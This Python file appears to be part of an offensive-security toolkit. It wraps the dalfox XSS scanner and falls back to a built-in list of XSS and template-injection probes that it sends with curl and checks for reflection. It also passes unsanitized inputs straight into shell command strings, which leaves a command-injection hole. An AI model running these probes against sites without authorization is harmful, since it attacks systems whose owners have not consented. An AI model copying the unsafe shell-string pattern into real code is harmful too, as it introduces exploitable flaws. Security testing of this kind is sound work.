"""XSS automation tool wrapping dalfox."""
from __future__ import annotations
from typing import Any
from utils import run_cmd

def scan_xss(target: str, params: str = "", blind_callback: str = "", custom_payload: str = "") -> dict[str, Any]:
    """Scan for XSS vulnerabilities using dalfox or fallback."""
    url = target if target.startswith("http") else f"https://{target}"
    # Try dalfox
    try:
        blind_flag = f"-b '{blind_callback}'" if blind_callback else ""
        cmd = f"dalfox url '{url}' {blind_flag} --skip-bav --silence --format json --timeout 10 2>/dev/null | head -50"
        result = run_cmd(cmd)
        if result and ("poc" in result.lower() or "vuln" in result.lower()):
            return {"stdout": result, "returncode": 0}
    except Exception:
        pass
    # Fallback: manual reflection check with common payloads
    payloads = [
        '<script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        "'-alert(1)-'",
        '{{7*7}}',
        '${7*7}',
        'javascript:alert(1)',
    ]
    if custom_payload:
        payloads.insert(0, custom_payload)
    found = []
    import re
    for payload in payloads:
        try:
            encoded = payload.replace("'", "%27").replace('"', "%22").replace("<", "%3C").replace(">", "%3E")
            sep = "&" if "?" in url else "?"
            test_url = f"{url}{sep}q={encoded}"
            result = run_cmd(f"curl -s '{test_url}' --max-time 10")
            # Check if unencoded payload appears in response (reflection)
            if payload in result or payload.replace("'", "&#39;") in result:
                found.append(f"REFLECTED: {payload[:50]} in response from {test_url[:80]}")
        except Exception:
            pass
    output = "\n".join(found) if found else "No XSS reflections detected"
    return {"stdout": output, "returncode": 0 if found else 1}
